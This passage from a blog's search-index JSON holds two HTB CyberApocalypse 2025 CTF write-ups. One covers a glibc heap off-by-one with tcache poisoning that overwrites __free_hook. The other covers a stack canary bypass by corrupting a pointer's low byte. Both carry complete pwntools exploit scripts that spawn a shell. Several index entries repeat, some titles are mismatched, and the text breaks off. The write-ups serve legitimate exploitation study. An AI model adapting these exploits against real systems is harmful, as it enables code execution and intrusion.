off-by-one write from editing Chunk A can therefore corrupt the metadata of Chunk B, specifically overwriting the Least Significant Byte (LSB) of its size field.\nDemonstration (Heap Dumps): Let‚Äôs visualize this using gef heap dumps from the analysis process. Assume Chunk A (data XXXX...) and Chunk B (data YYYY...) are adjacent, both allocated with size 0x28 (metadata size field 0x31 including the PREV_INUSE flag).\nHeap Before Overflow:\ngef&gt;  x/20xg &lt;address_of_chunk_A_metadata&gt;\n# ... (Chunk A metadata header, size 0x31) ...\n0x...e6a0: 0x5858585858585858  0x5858585858585858  &lt;- Chunk A User Data (XXXX...)\n0x...e6b0: 0x5858585858585858  0x5858585858585858\n0x...e6c0: 0x0000000000000000  0x0000000000000031  &lt;- Chunk B Metadata Header (Size=0x31)\n0x...e6d0: 0x5959595959595959  0x5959595959595959  &lt;- Chunk B User Data (YYYY...)\n# ...\nHeap After Editing Chunk A with 0x28 ‚ÄôA‚Äôs (no null terminator):\ngef&gt;  x/20xg &lt;address_of_chunk_A_metadata&gt;\n# ... (Chunk A metadata header, size 0x31) ...\n0x...e6a0: 0x4141414141414141  0x4141414141414141  &lt;- Chunk A User Data (AAAA...)\n0x...e6b0: 0x4141414141414141  0x4141414141414141\n0x...e6c0: 0x4141414141414141  0x0000000000000041  &lt;- Chunk B Metadata Header (Size CORRUPTED: 0x31 -&gt; 0x41)\n0x...e6d0: 0x5959595959595959  0x5959595959595959  &lt;- Chunk B User Data (YYYY...)\n# ...\nThe last ‚ÄòA‚Äô written overflowed by one byte, changing the size field at 0x...e6c8 from 0x31 to 0x41. By controlling this last byte (e.g., sending 0x27 * 'A' + '\\x91'), we can set the corrupted size precisely (e.g., to 0x91). This corruption is crucial because it can bypass heap consistency checks performed by free and interfere with chunk consolidation logic."
  },
  {
    "objectID": "blogs/strategist.html#heap-concepts-for-exploitation",
    "href": "blogs/strategist.html#heap-concepts-for-exploitation",
    "title": "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning",
    "section": "",
    "text": "Exploiting this requires understanding relevant glibc heap mechanisms (particularly relevant for versions &gt;= 2.26 which introduced Tcache):\n\nTcache (Thread-Local Cache):\n\nA performance optimization providing per-thread caches for recently freed small chunks (typically up to size 0x408).\nConsists of multiple bins, each holding chunks of a specific size.\nEach bin is a singly-linked LIFO (Last-In, First-Out) list, using the fd (forward) pointer within the freed chunk‚Äôs user data area to point to the next entry.\nA bin can hold a maximum of 7 chunks.\nmalloc checks the corresponding Tcache bin first before resorting to other bins or requesting memory from the system.\nCrucially, Tcache prioritizes speed and has fewer security checks compared to older bins, making it vulnerable to attacks like double-free, use-after-free, and poisoning of the fd pointer.\n\nUnsorted Bin:\n\nActs as a central, temporary cache (a global, doubly-linked list using fd and bk pointers) for freed chunks that don‚Äôt immediately go into Tcache (e.g., they are too large, or the relevant Tcache bin is full).\nChunks are processed later from the unsorted bin ‚Äì they might be consolidated with adjacent free chunks or moved to appropriate small/large bins.\nLibc Leak Source: While a chunk resides in the unsorted bin, its fd and bk pointers point into the main_arena structure within libc. If an attacker can read the contents of a chunk after it has been placed in the unsorted bin (e.g., by partially reallocating it), these pointers can be leaked, revealing runtime addresses within libc and defeating ASLR for the library.\n\nTcache Poisoning Attack:\n\nThe core technique used in this exploit.\nLeverages a vulnerability (like our off-by-one, or others like use-after-free/double-free) to overwrite the fd pointer of a chunk currently residing in a Tcache bin‚Äôs free list.\nThe attacker overwrites the fd pointer with the address of a target location (e.g., &__free_hook, a GOT entry, or another sensitive address).\nWhen malloc is subsequently called for that chunk size, it will:\n\nReturn the first chunk from the Tcache bin (the one whose fd pointer was overwritten).\nOn the next malloc call for the same size, follow the poisoned fd pointer and return the attacker-chosen target address.\n\nThis effectively gives the attacker a write-what-where primitive: malloc returns a pointer to the target, and subsequent input/editing can write arbitrary data there."
  },
  {
    "objectID": "blogs/strategist.html#exploitation-method-tcache-poisoning",
    "href": "blogs/strategist.html#exploitation-method-tcache-poisoning",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "The strategy combines the off-by-one with an Unsorted Bin leak and Tcache poisoning to overwrite __free_hook with system.\n\nLeak Libc Address (Unsorted Bin Attack):\n\nmalloc a large chunk (L) (&gt; 0x410 bytes) so it goes to the Unsorted Bin when freed.\nmalloc a small barrier chunk (prevents merging L with top chunk).\nfree(L). L is now in the Unsorted Bin, L-&gt;fd points into main_arena.\nmalloc a small chunk (S). malloc splits L, copying the main_arena pointer (from L-&gt;fd) into S‚Äôs user data area.\nRead the content of S to retrieve the leaked main_arena pointer.\nCalculate libc base address: libc_base = leaked_pointer - offset. The offset depends on the specific libc version and the exact main_arena pointer leaked (e.g., main_arena + 1104). This gives us runtime addresses for system, __free_hook, etc.\n\nHeap Setup & Metadata Corruption:\n\nAllocate several chunks to establish a predictable layout for Tcache manipulation (e.g., A(0x28), B(0x18, containing ‚Äú/bin/sh‚Äù), C(0x28), D(0x18)).\nTrigger the Off-by-One: edit(A) with 0x28 bytes, carefully choosing the last byte (e.g., \\x41 or \\x91) to overwrite the LSB of B‚Äôs size field. Change B‚Äôs size from 0x21 to an invalid-looking value like 0x41 or 0x91. This corrupted size helps bypass certain checks later.\n\nTcache Manipulation & Poisoning:\n\nFree chunks in a specific order to place the chunk with corrupted metadata (B) into the desired Tcache bin, followed by another chunk (D). Example free order: free(C), free(A), free(D), free(B).\nAfter free(B), the Tcache[0x20] bin head is B, and its fd points to D: Tcache[0x20]: B(fd=&D) -&gt; D -&gt; NULL.\nPoison Write: Allocate a new chunk (P) large enough (e.g., 0x30) whose memory location physically overlaps the metadata/data area of the now-freed chunk B. Write a payload into P: [Padding] + p64(address_of___free_hook). The padding is calculated so p64(...) overwrites the memory location where B‚Äôs fd pointer resides.\nThis implicitly poisons the Tcache list. Now: Tcache[0x20]: B(fd=&__free_hook) -&gt; D -&gt; NULL.\nmalloc(0x18): Returns chunk B (from Tcache head).\nmalloc(0x18): Follows the poisoned fd pointer and returns address_of___free_hook.\n\nOverwrite __free_hook & Trigger Execution:\n\nThe second malloc(0x18) returned a pointer to __free_hook. Let‚Äôs say this pointer corresponds to chunk index hook_idx.\nedit(hook_idx): Write the address of system (calculated from the libc leak) into this chunk. This directly overwrites the __free_hook function pointer.\nfree(B): Free the chunk that contains /bin/sh (original chunk B). The free function first calls the hook. Since __free_hook now points to system, this executes system(\"/bin/sh\").\n\nAchieve Shell."
  },
  {
    "objectID": "blogs/strategist.html#exploit-code-snippet-pwntools---key-parts",
    "href": "blogs/strategist.html#exploit-code-snippet-pwntools---key-parts",
    "title": "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning",
    "section": "",
    "text": "#!/usr/bin/python3\nfrom pwn import *\n\n# --- Setup (Connect, ELF/Libc info) ---\ncontext.arch = 'amd64'\ncontext.log_level = 'info' # Use 'debug' for more verbose heap info\ntarget = './strategist'\nlibc_path = './glibc/libc.so.6' # Adjust path to provided libc\n# connection = remote(host, port) # For remote target\nconnection = process(target, env={\"LD_PRELOAD\": libc_path}) # For local testing\nelf = ELF(target)\nlibc = ELF(libc_path)\n\n# --- Helper Functions (create, show, edit, delete) ---\ndef create(size, data):\n    connection.sendlineafter(b'&gt; ', b'1')\n    connection.sendlineafter(b'&gt; ', str(size).encode())\n    connection.sendafter(b'&gt; ', data)\n\ndef show(idx):\n    connection.sendlineafter(b'&gt; ', b'2')\n    connection.sendlineafter(b'&gt; ', str(idx).encode())\n    connection.recvuntil(f'Plan [{idx}]: '.encode())\n    return connection.recvline()\n\ndef edit(idx, data):\n    connection.sendlineafter(b'&gt; ', b'3')\n    connection.sendlineafter(b'&gt; ', str(idx).encode())\n    connection.sendafter(b'&gt; ', data)\n\ndef delete(idx):\n    connection.sendlineafter(b'&gt; ', b'4')\n    connection.sendlineafter(b'&gt; ', str(idx).encode())\n# --- End Helpers ---\n\n# --- 1. Libc Leak (Unsorted Bin) ---\nlog.info(\"Performing Libc Leak via Unsorted Bin...\")\ncreate(0x418, b'L'*8)       # Idx 0: Large chunk (L)\ncreate(0x18, b'Barrier'*2) # Idx 1: Barrier chunk\ndelete(0)                  # Free(L) -&gt; goes to Unsorted Bin\ncreate(0x18, b'S'*8)       # Idx 0: Reallocate small (S), gets split from L\nleak_data = show(0).strip()\n# Adjust parsing based on actual output structure if needed\nleaked_addr = u64(leak_data[len(b'S'*8):].ljust(8, b'\\x00'))\n# Offset calculation depends heavily on libc version and leak point.\n# This example assumes leak is main_arena + 1104 for libc 2.31\nmain_arena_offset = 1104\nlibc.address = leaked_addr - (libc.symbols['main_arena'] + main_arena_offset)\nlog.success(f\"Libc base: {hex(libc.address)}\")\nlog.info(f\"System @ {hex(libc.symbols.system)}\")\nlog.info(f\"__free_hook @ {hex(libc.symbols.__free_hook)}\")\n\n# --- 2. Heap Setup & Metadata Corruption ---\nlog.info(\"Setting up heap and triggering off-by-one...\")\ncreate(0x28, b'A'*0x28)       # Idx 1: Chunk A (size 0x30)\ncreate(0x18, b'/bin/sh\\x00') # Idx 2: Chunk B (size 0x20) &lt;- Holds command\ncreate(0x28, b'C'*0x28)       # Idx 3: Chunk C (size 0x30)\ncreate(0x18, b'D'*0x18)       # Idx 4: Chunk D (size 0x20) &lt;- Dummy Tcache entry\n# Trigger off-by-one by editing A (idx 1) to corrupt B's (idx 2) size LSB\n# Use \\x41 to change size 0x21 -&gt; 0x41. \\x91 would make it 0x91 etc.\nedit(1, b'A' * 0x28 + b'\\x41')\nlog.info(\"Chunk B's size potentially corrupted.\")\n\n# --- 3. Tcache Manipulation & Poisoning ---\nlog.info(\"Freeing chunks to prime Tcache[0x20] and poisoning...\")\n# Free order: C, A (fill Tcache[0x30]), D, B (fill Tcache[0x20])\ndelete(3) # Free C(idx 3) -&gt; Tcache[0x30]\ndelete(1) # Free A(idx 1) -&gt; Tcache[0x30]\ndelete(4) # Free D(idx 4) -&gt; Tcache[0x20] = D -&gt; NULL\ndelete(2) # Free B(idx 2) -&gt; Tcache[0x20] = B -&gt; D -&gt; NULL\n\n# Poison Write: Allocate chunk P (idx 1) overlapping B's old location.\n# Payload must overwrite the memory where B-&gt;fd was stored.\n# Padding calculation might be needed depending on exact chunk layout/libc.\n# Assuming 0x18 bytes of padding reaches the fd pointer for a 0x28 chunk.\ncreate(0x28, b'P'*0x18 + p64(libc.symbols.__free_hook)) # Poison B's fd\nlog.info(\"Tcache[0x20] poisoned: B-&gt;fd now points to __free_hook\")\n\nlog.info(\"Allocating twice from Tcache[0x20]...\")\n# First allocation gets the space of chunk B\ncreate(0x18, b'X'*8) # Idx 2: Re-allocates B's space\n# Second allocation follows the poisoned fd pointer\n# It returns a pointer to __free_hook, write system address there directly.\ncreate(0x18, p64(libc.symbols.system)) # Idx 3: Allocates AT __free_hook, writes &system\n\nlog.info(\"__free_hook overwritten with system().\")\n\n# --- 4. Trigger Execution ---\nlog.info(\"Triggering hook by freeing chunk containing '/bin/sh'...\")\n# We need to free the chunk containing \"/bin/sh\".\n# Find the current index of the chunk holding \"/bin/sh\".\n# If original chunk B (idx 2) was overwritten by the 'X'*8 allocation,\n# we need to use another chunk. Let's re-create it if needed.\n# Assuming we need to create a new one:\ncreate(0x18, b'/bin/sh\\x00') # Idx 4: Ensure /bin/sh exists\ndelete(4) # Free this chunk -&gt; system(\"/bin/sh\") executed\n\n\n# --- 5. Interact ---\nlog.success(\"Shell popped?\")\nconnection.interactive()\nNote: Heap exploitation, especially involving Tcache, is highly sensitive to the libc version and the exact sequence of allocations/frees. The indices, sizes, padding, and offsets in the code snippet are illustrative based on common patterns and the provided analysis; they may require careful adjustment and debugging against the specific target environment using tools like gdb with gef or pwndbg."
  },
  {
    "objectID": "blogs/strategist.html#conclusion",
    "href": "blogs/strategist.html#conclusion",
    "title": "HTB CyberApocalypse 2025 - Strategist: Heap Exploitation via Off-by-One and Tcache Poisoning",
    "section": "",
    "text": "This deep dive into the strategist challenge demonstrated how an off-by-one heap overflow, often considered a minor vulnerability, can be a powerful primitive for modern heap exploitation. By carefully corrupting metadata to interfere with heap management logic, leaking a libc address via the Unsorted Bin, and executing a Tcache poisoning attack, control over the __free_hook function pointer was gained, leading to arbitrary code execution. This process highlights the intricate nature of heap manipulation and the critical importance of understanding glibc heap allocator internals for identifying and exploiting such vulnerabilities."
  },
  {
    "objectID": "blogs/contractor.html",
    "href": "blogs/contractor.html",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX (Non-Executable Stack), and PIE (Position Independent Executable) significantly complicate exploitation. Standard overflows that overwrite the return address (RIP) often corrupt the canary value placed below it, causing the program to detect the tampering and terminate via __stack_chk_fail. This post delves into stack exploitation techniques demonstrated in the Hack The Box CyberApocalypse 2025 CTF (March 21-26). Specifically, we analyze the contractor challenge to illustrate how a specific stack layout and a vulnerability in pointer usage can be combined to bypass stack canaries without leaking the canary value itself, achieving control flow hijacking by corrupting a different stack-based pointer during the overflow."
  },
  {
    "objectID": "blogs/contractor.html#introduction",
    "href": "blogs/contractor.html#introduction",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "",
    "text": "Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX (Non-Executable Stack), and PIE (Position Independent Executable) significantly complicate exploitation. Standard overflows that overwrite the return address (RIP) often corrupt the canary value placed below it, causing the program to detect the tampering and terminate via __stack_chk_fail. This post delves into stack exploitation techniques demonstrated in the Hack The Box CyberApocalypse 2025 CTF (March 21-26). Specifically, we analyze the contractor challenge to illustrate how a specific stack layout and a vulnerability in pointer usage can be combined to bypass stack canaries without leaking the canary value itself, achieving control flow hijacking by corrupting a different stack-based pointer during the overflow."
  },
  {
    "objectID": "blogs/contractor.html#binary-analysis-context",
    "href": "blogs/contractor.html#binary-analysis-context",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Binary Analysis Context",
    "text": "Binary Analysis Context\nThe subject of this analysis is a 64-bit ELF binary. Key security mitigations enabled are:\n[*] './contractor'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\nThe binary takes user details (name, reason, age, specialty) and allows editing them. The core vulnerabilities lie in how the ‚Äòspecialty‚Äô field is handled. A function named contract exists, which simply calls execl(\"/bin/sh\", \"sh\", 0), making it an ideal target for control flow hijacking.\nint64_t contract() {\n     // Simplified - includes canary check logic before/after execl\n     execl(\"/bin/sh\", \"sh\", 0); // The goal\n     // ... canary check failure calls __stack_chk_fail() ...\n}"
  },
  {
    "objectID": "blogs/contractor.html#vulnerability-1-information-leak-via-unterminated-string-read",
    "href": "blogs/contractor.html#vulnerability-1-information-leak-via-unterminated-string-read",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Vulnerability 1: Information Leak via Unterminated String Read",
    "text": "Vulnerability 1: Information Leak via Unterminated String Read\nThe initial input routine reading the specialty field copies user input byte-by-byte into a 16-byte buffer on the stack.\n// Simplified C representation of the initial input loop for 'specialty'\nchar specialty_buffer[16];\nchar byte_read;\nint i = 0;\nwhile (i &lt;= 0xf) // Reads up to 16 bytes (index 0 to 15)\n{\n    read(0, &byte_read, 1);\n    if (byte_read == '\\n')\n        break;\n    specialty_buffer[i] = byte_read;\n    i++;\n}\n// CRITICAL FLAW: If exactly 16 bytes are read (i=16) before a newline,\n// no null terminator ('\\0') is added to specialty_buffer!\nLater, when the program displays a summary of the entered information, it likely uses standard C library functions like printf or puts to print the specialty. These functions expect null-terminated strings. If specialty_buffer lacks a null terminator, these functions will continue reading adjacent data from the stack beyond the intended 16 bytes until they encounter a null byte or cause a crash.\nDynamic analysis (debugging with GDB/GEF) reveals that a pointer into the binary‚Äôs own code segment (.text) resides on the stack immediately following specialty_buffer. When the unterminated buffer is printed, this pointer‚Äôs bytes are included in the output, effectively leaking a runtime address within the binary.\nBypassing PIE: This address leak is crucial for defeating PIE. 1. Leak: Obtain the leaked runtime address (e.g., 0x55...5b50). 2. Analyze: Determine the static offset of this address relative to the binary‚Äôs base address using static analysis tools (e.g., Binary Ninja, objdump). Let‚Äôs assume this offset is 0x1b50. 3. Calculate: Compute the runtime base address: Runtime Base = Leaked Address - Static Offset (e.g., 0x55...4000 = 0x55...5b50 - 0x1b50). With the base address known, we can calculate the runtime address of any desired function (contract) or ROP gadget within the binary."
  },
  {
    "objectID": "blogs/contractor.html#vulnerability-2-stack-buffer-overflow",
    "href": "blogs/contractor.html#vulnerability-2-stack-buffer-overflow",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Vulnerability 2: Stack Buffer Overflow",
    "text": "Vulnerability 2: Stack Buffer Overflow\nWhen the user chooses option 4 to edit the specialty field, a different, more dangerous input routine is invoked.\n// Simplified C representation of the EDIT specialty loop\n// rax_10 often holds a pointer related to the start of the stack frame or struct\nchar safe_buffer; // Reads one byte at a time\nint i = 0;\nwhile (i &lt;= 0xff) // Loop condition allows reading up to 256 bytes!\n{\n    read(0, &safe_buffer, 1);\n    if (safe_buffer == '\\n')\n        break;\n    // Calculation eventually targets the 16-byte specialty_buffer area\n    *(uint8_t*)(rax_10 + (int64_t)i + 0x10) = safe_buffer;\n    i++;\n}\nThis loop reads up to 256 bytes but attempts to write them into the stack region allocated for the 16-byte specialty. This provides a classic stack buffer overflow primitive, allowing an attacker to write data beyond the intended buffer, potentially overwriting saved registers (like RBP) and, crucially, the saved return address (RIP)."
  },
  {
    "objectID": "blogs/contractor.html#vulnerability-3-canary-bypass-via-stack-pointer-lsb-corruption",
    "href": "blogs/contractor.html#vulnerability-3-canary-bypass-via-stack-pointer-lsb-corruption",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Vulnerability 3: Canary Bypass via Stack Pointer LSB Corruption",
    "text": "Vulnerability 3: Canary Bypass via Stack Pointer LSB Corruption\nThe primary challenge is bypassing the stack canary located between the buffer and the saved RIP. The vulnerability lies in the specific stack layout and how the overflow write is performed.\nStack Layout:\n      +-------------------------+ High Address\n      | Saved RIP               | &lt;-- Target (Overwrite this)\n      +-------------------------+\n      | Stack Canary            | &lt;-- Obstacle (Do NOT overwrite this)\n      +-------------------------+\n      | Saved RBP               |\n      +-------------------------+\n      | Stack Ptr (*inf_ptr)    | &lt;-- Corruption Target (Pointer TO the struct)\n      +-------------------------+\n      | Binary Ptr (leaked)     |\n      +-------------------------+\n      | specialty_buffer (16B)  | &lt;-- Overflow Source\n      +-------------------------+\n      | Other local vars...     |\n      +-------------------------+ Low Address\nA pointer variable (inf_ptr), also stored on the stack, points to the beginning of the user information structure (which includes specialty). Crucially, inf_ptr is located after the specialty_buffer but before the canary. The vulnerable edit loop uses this inf_ptr to calculate the destination address for each byte it writes: *(inf_ptr + offset + loop_index) = input_byte;.\nThe Corruption Mechanism: 1. Begin the overflow payload, filling the specialty_buffer.\n2. Continue the payload until it reaches the memory location storing the inf_ptr variable.\n3. Overwrite only the Least Significant Byte (LSB) of the stored inf_ptr value with a specific byte (e.g., \\xcf). The exact byte depends on runtime stack alignment due to ASLR.\n4. The write loop immediately starts using this corrupted inf_ptr value to calculate the destination for the remaining bytes of the payload.\n5. The corrupted pointer effectively shifts the target write address higher up the stack, causing the rest of the payload (containing the desired RIP value and ROP gadgets) to land after the canary‚Äôs location, directly overwriting Saved RBP and Saved RIP.\nThe canary value itself remains untouched, bypassing the __stack_chk_fail check."
  },
  {
    "objectID": "blogs/contractor.html#exploitation-method",
    "href": "blogs/contractor.html#exploitation-method",
    "title": "CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Exploitation Method",
    "text": "Exploitation Method\n\nLeak Address: Interact with the program, provide 16 bytes for specialty, parse the output to get the leaked binary pointer, and calculate the binary‚Äôs base address.\nTrigger Overflow: Select the option to edit the specialty field.\nCraft Payload: Construct the overflow buffer:\n\nPadding (e.g., b'A' * 32) to reach the inf_ptr LSB.\nCorruption byte (e.g., b'\\xcf'). Value determined by experimentation or calculation based on likely alignment.\nROP Chain (written via corrupted pointer):\n\np64(calculated_ret_gadget_addr): For stack alignment.\np64(calculated_contract_func_addr): Target function address.\n\n\nSend Payload: Send the crafted buffer and confirm the edit.\nRetry Logic: Enclose steps 2-4 in a loop. Since the correct corruption byte depends on stack ASLR alignment, the exploit may only succeed when the LSB aligns correctly with the chosen byte. The loop retries until successful exploitation.\nExecute Code: Upon success, RIP is overwritten with the contract function address (or a ROP chain leading to it), resulting in /bin/sh execution."
  },
  {
    "objectID": "blogs/contractor.html#exploit-code-snippet-pwntools",
    "href": "blogs/contractor.html#exploit-code-snippet-pwntools",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Exploit Code Snippet (Pwntools)",
    "text": "Exploit Code Snippet (Pwntools)\n#!/usr/bin/python3\nfrom pwn import *\nimport warnings\nimport os\n\n# --- Setup ---\ncontext.arch = 'amd64'\n# context.log_level = 'debug' # Use debug for verbose output\ncontext.log_level = 'critical' # Use critical for clean retry loop\nwarnings.filterwarnings('ignore')\n\ntarget = './contractor'\nelf = ELF(target)\n\n# --- Retry Loop ---\nattempt_count = 0\nwhile True:\n    attempt_count += 1\n    try:\n        # connection = remote('ip', port) # For remote target\n        connection = process(target) # Use process for local testing\n\n        # --- Initial Interaction (Dummy data) ---\n        connection.sendlineafter(b'&gt; ', b'Exploiter')\n        connection.sendlineafter(b'&gt; ', b'Bypassing Canary')\n        connection.sendlineafter(b'&gt; ', b'99')\n\n        # --- 1. Leak Address ---\n        leak_trigger = b'A' * 16 # Exactly 16 bytes, no newline\n        connection.sendlineafter(b'&gt; ', leak_trigger)\n        connection.recvuntil(leak_trigger) # Read until the end of our input\n        leaked_bytes = connection.recvline().strip() # Next line contains leak\n        # Ensure correct padding and unpacking\n        try:\n             leaked_addr = u64(leaked_bytes.ljust(8, b'\\x00'))\n        except struct.error:\n             print(f\"\\r[-] Attempt {attempt_count}: Failed to unpack leak: {leaked_bytes}\", flush=True)\n             connection.close()\n             continue # Retry\n\n        # Static offset found via GDB/Binja: address_in_leak - base_address\n        static_offset = 0x1b50\n        elf.address = leaked_addr - static_offset # Calculate runtime base\n        print(f'\\r[+] Attempt {attempt_count}: Base @ {hex(elf.address)}', end='', flush=True)\n\n        # --- 2. Trigger Overflow ---\n        connection.sendlineafter(b'&gt; ', b'4') # Select option 4 to edit specialty\n\n        # --- 3. Craft Payload ---\n        # Padding size needs careful calculation based on GDB analysis\n        # It must reach exactly the LSB of the stack pointer variable (*inf_ptr)\n        padding_to_ptr_lsb = 32 # Example value, ADJUST BASED ON DEBUGGING\n        corruption_byte = b'\\xcf' # The byte to corrupt LSB, needs luck/retry\n        ret_gadget_offset = 0x101a # Offset of a 'ret;' instruction\n        target_func_offset = elf.sym.contract # Offset of target function\n\n        payload = b'A' * padding_to_ptr_lsb\n        payload += corruption_byte\n        # ROP Chain - written via corrupted pointer, lands on RIP\n        payload += p64(elf.address + ret_gadget_offset) # RET for alignment\n        payload += p64(elf.address + target_func_offset)  # Address of contract()\n\n        # --- 4. Send Payload ---\n        connection.sendlineafter(b': ', payload) # Send the overflow payload\n        connection.sendlineafter(b'&gt; ', b'Yes') # Confirm the edit\n\n        # --- 5. Check for Success (Try running a command) ---\n        connection.sendline(b'echo HACKED_SUCCESS') # Send command to potential shell\n        result = connection.recvline_contains(b'HACKED_SUCCESS', timeout=0.3) # Increased timeout slightly\n\n        if b'HACKED_SUCCESS' in result:\n            print(f'\\n\\n[!] Success on attempt {attempt_count}! Shell obtained.')\n            connection.interactive() # Get interactive shell\n            break # Exit retry loop\n\n        # If command didn't work, assume exploit failed for this alignment\n        connection.close()\n\n    except EOFError: # Process likely crashed or closed connection\n        # print(f\"\\r[-] Attempt {attempt_count}: EOFError\", flush=True) # Uncomment for debug\n        connection.close()\n    except Exception as e: # Catch other potential errors\n        # print(f\"\\r[-] Attempt {attempt_count}: Error {e}\", flush=True) # Uncomment for debug\n        connection.close()\n\n# Optional: Add a max attempts check here if desired\n# if not connection.connected:\n#    print(\"\\n[-] Exploit failed after multiple attempts.\")"
  },
  {
    "objectID": "blogs/contractor.html#conclusion",
    "href": "blogs/contractor.html#conclusion",
    "title": "HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries",
    "section": "Conclusion",
    "text": "Conclusion\nThis analysis of the contractor challenge from HTB CyberApocalypse 2025 demonstrated a practical technique for bypassing stack canaries without needing to leak the canary value itself. By leveraging a detailed understanding of the stack layout gained through debugging, and exploiting the immediate effect of overwriting a stack-based pointer used within the overflow routine itself, control flow hijacking was achieved despite multiple modern defenses (Canary, PIE, NX, SHSTK, IBT). This highlights that even with layered security, vulnerabilities in specific code patterns and memory layouts can provide viable exploitation paths, often requiring careful analysis and sometimes non-deterministic techniques like the retry loop used here to handle ASLR-induced alignment variations."
  },
  {
    "objectID": "blogs/strategist.html#c-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "href": "blogs/strategist.html#c-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Heap Exploitation Deep Dive: Tcache Poisoning via Off-by-One\n\nHeap exploitation often involves subtle vulnerabilities that corrupt metadata, leading to powerful control over memory allocation. This post explores how a seemingly minor off-by-one heap overflow can be escalated into a full Tcache poisoning attack to achieve arbitrary code execution. We'll analyze a specific binary (`strategist`) to illustrate the steps involved, including leaking a `libc` address and overwriting the `__free_hook`.\n\nThis analysis focuses on heap vulnerabilities. For an example of stack exploitation, see the companion post on [Exploiting Stack Pointer Corruption to Bypass Canaries](link-to-contractor-post.md). ## Binary Analysis Context\n\nThe target is a 64-bit ELF binary that manages user-defined \"plans\" using dynamic memory allocation (`malloc`, `free`, etc.). Security mitigations include:\n\n```text\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, and PIE necessitates an information leak. The core vulnerability lies in the edit_plan functionality."
  },
  {
    "objectID": "blogs/strategist.html#cyberapocalypse2025-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "href": "blogs/strategist.html#cyberapocalypse2025-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Heap Exploitation Deep Dive: Tcache Poisoning via Off-by-One\n\nHeap exploitation often involves subtle vulnerabilities that corrupt metadata, leading to powerful control over memory allocation. This post explores how a seemingly minor off-by-one heap overflow can be escalated into a full Tcache poisoning attack to achieve arbitrary code execution. We'll analyze a specific binary (`strategist`) to illustrate the steps involved, including leaking a `libc` address and overwriting the `__free_hook`.\n\nThis analysis focuses on heap vulnerabilities. For an example of stack exploitation, see the companion post on [Exploiting Stack Pointer Corruption to Bypass Canaries](link-to-contractor-post.md). ## Binary Analysis Context\n\nThe target is a 64-bit ELF binary that manages user-defined \"plans\" using dynamic memory allocation (`malloc`, `free`, etc.). Security mitigations include:\n\n```text\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, and PIE necessitates an information leak. The core vulnerability lies in the edit_plan functionality."
  },
  {
    "objectID": "blogs/strategist.html#cyberpocalypse2025-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "href": "blogs/strategist.html#cyberpocalypse2025-heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "title": "Matej Olexa",
    "section": "",
    "text": "# Heap Exploitation Deep Dive: Tcache Poisoning via Off-by-One\n\nHeap exploitation often involves subtle vulnerabilities that corrupt metadata, leading to powerful control over memory allocation. This post explores how a seemingly minor off-by-one heap overflow can be escalated into a full Tcache poisoning attack to achieve arbitrary code execution. We'll analyze a specific binary (`strategist`) to illustrate the steps involved, including leaking a `libc` address and overwriting the `__free_hook`.\n\nThis analysis focuses on heap vulnerabilities. For an example of stack exploitation, see the companion post on [Exploiting Stack Pointer Corruption to Bypass Canaries](link-to-contractor-post.md). ## Binary Analysis Context\n\nThe target is a 64-bit ELF binary that manages user-defined \"plans\" using dynamic memory allocation (`malloc`, `free`, etc.). Security mitigations include:\n\n```text\n[*] './strategist'\nArch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      Canary found\nNX:         NX enabled\nPIE:        PIE enabled\nRUNPATH:    b'./glibc/'\nStripped:   No\nFull RELRO prevents easy GOT overwrites, and PIE necessitates an information leak. The core vulnerability lies in the edit_plan functionality."
  },
  {
    "objectID": "blogs/strategist.html#cyberapocalypse2025---heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "href": "blogs/strategist.html#cyberapocalypse2025---heap-exploitation-deep-dive-tcache-poisoning-via-off-by-one",
    "title": "Matej Olexa",
    "section": "",
